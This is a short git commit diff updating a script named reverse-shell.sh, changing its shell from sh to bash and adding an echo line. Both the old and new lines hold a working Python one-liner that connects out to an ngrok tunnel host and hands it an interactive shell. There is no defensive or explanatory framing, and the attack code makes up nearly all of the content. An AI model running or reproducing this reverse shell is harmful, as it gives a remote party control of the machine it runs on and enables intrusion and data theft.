50e61afa7bf29817c530aa8d74c9ff49cf17e9ac
jihyangleee <160590749+jihyangleee@users.noreply.github.com>
2025-07-20 02:00:25 +0900

    Update reverse-shell.sh

--- reverse-shell.sh
+++ reverse-shell.sh
@@ -1,4 +1,6 @@
-#!/bin/sh
-python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.jp.ngrok.io",10478));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+#!/bin/bash
+echo "Using bash..."
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("0.tcp.jp.ngrok.io",10478));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
 
 
